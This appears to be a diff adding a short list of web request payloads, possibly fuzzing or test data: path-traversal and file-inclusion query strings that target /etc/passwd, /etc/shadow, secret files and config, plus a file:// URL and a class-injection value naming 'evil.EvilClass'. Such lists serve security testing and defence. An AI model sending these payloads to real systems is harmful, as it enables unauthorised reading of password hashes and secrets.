@@ -1,0 +1,6 @@
+?file=/etc/passwd
+?resource=../../secret.txt
+?id=../config
+?module=../../../../etc/shadow
+?page=file:///etc/passwd
+?class=evil.EvilClass
